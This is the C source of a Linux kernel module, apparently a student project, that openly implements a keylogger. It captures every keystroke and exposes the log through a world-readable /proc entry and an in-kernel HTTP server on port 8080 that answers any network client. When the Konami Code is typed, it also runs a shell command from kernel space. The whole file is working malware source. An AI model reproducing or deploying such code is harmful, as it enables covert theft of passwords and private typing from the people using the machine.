#include <linux/input-event-codes.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/seq_file.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/timer.h>
#include <linux/io.h>
#include <linux/kmod.h>
#include <linux/workqueue.h>
#include <linux/input.h>
#include <linux/socket.h>
#include <linux/in.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <net/sock.h>

#define PROC_FILENAME "keylogger"
#define MAX_KEY_LOG_SIZE 2048 // Increased buffer size
#define PORT 8080

static struct notifier_block nb;
static char key_log[MAX_KEY_LOG_SIZE];
static int key_log_index = 0;
static int sequence_index = 0;
static struct proc_dir_entry *proc_entry;

// Define the full Konami Code sequence
static const int konami_sequence[] = {
    KEY_UP, KEY_UP, KEY_DOWN, KEY_DOWN,
    KEY_LEFT, KEY_RIGHT, KEY_LEFT, KEY_RIGHT,
    KEY_B, KEY_A
};

static struct workqueue_struct *wq;
struct keylogger_execute_work {
    struct work_struct work;
};

static void execute_command_work(struct work_struct *work) {
    char *argv[] = { "/bin/sh", "-c", "sudo speaker-test -t sine -f 1000 -l 1 > /tmp/speaker-test.log 2>&1", NULL };
    static char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    int ret;

    printk(KERN_INFO "Executing command: %s %s %s\n", argv[0], argv[1], argv[2]);
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    if (ret != 0) {
        printk(KERN_ERR "Failed to execute command, return code: %d\n", ret);
        printk(KERN_ERR "Check /tmp/speaker-test.log for details.\n");
    } else {
        printk(KERN_INFO "Command executed successfully.\n");
    }
    kfree(work);
}

static const char* get_char_from_keycode(int keycode, int shift) {
    switch (keycode) {
        case KEY_RESERVED: return " ";
        case KEY_ESC: return "\033";
        case KEY_1: return shift ? "!" : "1";
        case KEY_2: return shift ? "@" : "2";
        case KEY_3: return shift ? "#" : "3";
        case KEY_4: return shift ? "$" : "4";
        case KEY_5: return shift ? "%" : "5";
        case KEY_6: return shift ? "^" : "6";
        case KEY_7: return shift ? "&" : "7";
        case KEY_8: return shift ? "*" : "8";
        case KEY_9: return shift ? "(" : "9";
        case KEY_0: return shift ? ")" : "0";
        case KEY_MINUS: return shift ? "_" : "-";
        case KEY_EQUAL: return shift ? "+" : "=";
        case KEY_BACKSPACE: return "[BACKSPACE]";
        case KEY_TAB: return "\t";
        case KEY_Q: return shift ? "Q" : "q";
        case KEY_W: return shift ? "W" : "w";
        case KEY_E: return shift ? "E" : "e";
        case KEY_R: return shift ? "R" : "r";
        case KEY_T: return shift ? "T" : "t";
        case KEY_Y: return shift ? "Y" : "y";
        case KEY_U: return shift ? "U" : "u";
        case KEY_I: return shift ? "I" : "i";
        case KEY_O: return shift ? "O" : "o";
        case KEY_P: return shift ? "P" : "p";
        case KEY_LEFTBRACE: return shift ? "{" : "[";
        case KEY_RIGHTBRACE: return shift ? "}" : "]";
        case KEY_ENTER: return "\n";
        case KEY_LEFTCTRL: return "";
        case KEY_A: return shift ? "A" : "a";
        case KEY_S: return shift ? "S" : "s";
        case KEY_D: return shift ? "D" : "d";
        case KEY_F: return shift ? "F" : "f";
        case KEY_G: return shift ? "G" : "g";
        case KEY_H: return shift ? "H" : "h";
        case KEY_J: return shift ? "J" : "j";
        case KEY_K: return shift ? "K" : "k";
        case KEY_L: return shift ? "L" : "l";
        case KEY_SEMICOLON: return shift ? ":" : ";";
        case KEY_APOSTROPHE: return shift ? "\"" : "'";
        case KEY_GRAVE: return shift ? "~" : "`";
        case KEY_BACKSLASH: return shift ? "|" : "\\";
        case KEY_Z: return shift ? "Z" : "z";
        case KEY_X: return shift ? "X" : "x";
        case KEY_C: return shift ? "C" : "c";
        case KEY_V: return shift ? "V" : "v";
        case KEY_B: return shift ? "B" : "b";
        case KEY_N: return shift ? "N" : "n";
        case KEY_M: return shift ? "M" : "m";
        case KEY_COMMA: return shift ? "<" : ",";
        case KEY_DOT: return shift ? ">" : ".";
        case KEY_SLASH: return shift ? "?" : "/";
        case KEY_KPASTERISK: return "*";
        case KEY_LEFTALT: return "";
        case KEY_SPACE: return " ";
        case KEY_CAPSLOCK: return "";
        case KEY_F1: return "[F1]";
        case KEY_F2: return "[F2]";
        case KEY_F3: return "[F3]";
        case KEY_F4: return "[F4]";
        case KEY_F5: return "[F5]";
        case KEY_F6: return "[F6]";
        case KEY_F7: return "[F7]";
        case KEY_F8: return "[F8]";
        case KEY_F9: return "[F9]";
        case KEY_F10: return "[F10]";
        case KEY_NUMLOCK: return "";
        case KEY_SCROLLLOCK: return "";
        case KEY_KP7: return "7";
        case KEY_KP8: return "8";
        case KEY_KP9: return "9";
        case KEY_KPMINUS: return "-";
        case KEY_KP4: return "4";
        case KEY_KP5: return "5";
        case KEY_KP6: return "6";
        case KEY_KPPLUS: return "+";
        case KEY_KP1: return "1";
        case KEY_KP2: return "2";
        case KEY_KP3: return "3";
        case KEY_KP0: return "0";
        case KEY_KPDOT: return ".";
        case KEY_UP: return "[UP]"; // Representing UP with 'U'
        case KEY_DOWN: return "[DOWN]"; // Representing DOWN with 'D'
        case KEY_LEFT: return "[LEFT]"; // Representing LEFT with 'L'
        case KEY_RIGHT: return "[RIGHT]"; // Representing RIGHT with 'R'
        default: return " ";
    }
}

static void check_sequence(int keycode) {
    if (keycode == konami_sequence[sequence_index]) {
        sequence_index++;
        if (sequence_index == ARRAY_SIZE(konami_sequence)) {
            printk(KERN_INFO "Konami Code entered: Executing command!\n");

            struct keylogger_execute_work *ew = kmalloc(sizeof(struct keylogger_execute_work), GFP_KERNEL);
            if (ew) {
                INIT_WORK(&ew->work, execute_command_work);
                queue_work(wq, &ew->work);
            } else {
                printk(KERN_ERR "Failed to allocate memory for work struct.\n");
            }
            
            sequence_index = 0; // Reset sequence
        }
    } else {
        sequence_index = 0; // Reset sequence if keycode does not match
    }
}

static int keylogger_notify(struct notifier_block *self, unsigned long event, void *data) {
    struct keyboard_notifier_param *param = data;

    if (event == KBD_KEYCODE && param->down && key_log_index < MAX_KEY_LOG_SIZE - 2) {
    
        int shift = (param->shift != 0);
    	
        const char *character = get_char_from_keycode(param->value, shift);
        if (*character != ' ' || (key_log_index > 0 && key_log[key_log_index - 1] != ' ')) {
            while (*character != '\0') {
                key_log[key_log_index++] = *character;
                if (key_log_index >= MAX_KEY_LOG_SIZE - 1)
                    break;
                character++;
            }
            key_log[key_log_index] = '\0';
            printk(KERN_INFO "Pressed key: %s\n", character);
            
            // Check sequence
            check_sequence(param->value);
        }
    }

    return NOTIFY_OK;
}

static int keylogger_proc_show(struct seq_file *m, void *v) {
    int i;
    for (i = 0; i < key_log_index; ++i) {
        seq_putc(m, key_log[i]);
    }
    return 0;
}

static int keylogger_proc_open(struct inode *inode, struct file *file) {
    return single_open(file, keylogger_proc_show, NULL);
}

static const struct proc_ops keylogger_fops = {
    .proc_open = keylogger_proc_open,
    .proc_read = seq_read,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};

// HTTP server thread
static int http_server_thread(void *arg) {
    struct socket *sock;
    struct sockaddr_in server_addr;
    struct socket *client_sock;
    char http_response[2048];
    int ret;

    // Create a socket
    ret = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0) {
        printk(KERN_ERR "Failed to create socket\n");
        return -1;
    }

    // Bind the socket
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(PORT);
    ret = kernel_bind(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
    if (ret < 0) {
        printk(KERN_ERR "Failed to bind socket\n");
        sock_release(sock);
        return -1;
    }

    // Listen on the socket
    ret = kernel_listen(sock, 5);
    if (ret < 0) {
        printk(KERN_ERR "Failed to listen on socket\n");
        sock_release(sock);
        return -1;
    }

    printk(KERN_INFO "HTTP server listening on port %d\n", PORT);

    while (!kthread_should_stop()) {
        // Accept a client connection
        ret = kernel_accept(sock, &client_sock, 0);
        if (ret < 0) {
            printk(KERN_ERR "Failed to accept connection\n");
            continue;
        }

        // Create HTTP response
        snprintf(http_response, sizeof(http_response),
                 "HTTP/1.1 200 OK\r\n"
                 "Content-Length: %d\r\n"
                 "Content-Type: text/plain\r\n"
                 "\r\n"
                 "%s", key_log_index, key_log);

        // Send HTTP response
        kernel_sendmsg(client_sock, &(struct msghdr){
            .msg_flags = MSG_NOSIGNAL
        }, (struct kvec[]){
            {
                .iov_base = http_response,
                .iov_len = strlen(http_response)
            }
        }, 1, strlen(http_response));

        // Close client socket
        kernel_sock_shutdown(client_sock, SHUT_RDWR);
        sock_release(client_sock);
    }

    sock_release(sock);
    return 0;
}

static struct task_struct *http_server_task;

static int __init keylogger_init(void) {
    nb.notifier_call = keylogger_notify;
    register_keyboard_notifier(&nb);
    printk(KERN_INFO "Keylogger module initialized.\n");

    proc_entry = proc_create(PROC_FILENAME, 0444, NULL, &keylogger_fops);
    if (!proc_entry) {
        printk(KERN_ERR "Failed to create proc entry.\n");
        return -ENOMEM;
    }

    wq = create_singlethread_workqueue("keylogger_wq");
    if (!wq) {
        printk(KERN_ERR "Failed to create workqueue.\n");
        remove_proc_entry(PROC_FILENAME, NULL);
        return -ENOMEM;
    }

    http_server_task = kthread_run(http_server_thread, NULL, "http_server_thread");
    if (IS_ERR(http_server_task)) {
        printk(KERN_ERR "Failed to create HTTP server thread\n");
        remove_proc_entry(PROC_FILENAME, NULL);
        if (wq) {
            destroy_workqueue(wq);
        }
        return PTR_ERR(http_server_task);
    }

    printk(KERN_INFO "Keylogger proc entry created and HTTP server started.\n");
    return 0;
}

static void __exit keylogger_exit(void) {
    unregister_keyboard_notifier(&nb);
    remove_proc_entry(PROC_FILENAME, NULL);
    if (wq) {
        flush_workqueue(wq);
        destroy_workqueue(wq);
    }
    if (http_server_task) {
        kthread_stop(http_server_task);
    }
    printk(KERN_INFO "Keylogger module unloaded.\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Piotr, Karolina, Kasia i Julia :)");
MODULE_DESCRIPTION("A simple keylogger with a custom command execution on Konami Code sequence and HTTP server.");
